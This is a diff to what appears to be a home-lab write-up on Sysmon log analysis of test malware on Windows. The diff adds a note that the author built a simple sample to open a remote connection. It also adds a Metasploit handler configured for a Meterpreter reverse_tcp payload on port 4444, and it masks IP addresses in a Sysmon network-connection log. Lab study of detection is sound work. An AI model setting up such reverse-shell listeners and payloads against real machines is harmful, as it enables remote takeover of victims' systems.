@@ -155,7 +155,19 @@ ProcessId: 6392
 Image: C:\Users\home\Downloads\injection.exe
 ```
 
-**Explanation**: The process was terminated shortly after execution, possibly due to Windows defenses or a code error.
+**Explanation**: The process was terminated shortly after execution, possibly due to Windows security defenses or a code error.  
+To proceed with the Sysmon log analysis, I created a simpler malware sample whose only purpose was to initiate a remote connection.
+
+```bash
+msfconsole
+
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST ##.##.##.##
+set LPORT 4444
+run
+```
+
 
 ![Image](https://github.com/user-attachments/assets/654d581d-448b-41fd-9989-a6007542fccf)
 
@@ -165,7 +177,7 @@ Image: C:\Users\home\Downloads\injection.exe
 UtcTime: 2025-05-08 17:16:34.953
 ProcessId: 5104
 Image: C:\Users\home\Downloads\final.exe
-DestinationIp: 192.168.1.201
+DestinationIp: ##.##.##.#
 DestinationPort: 4444
 ```
 
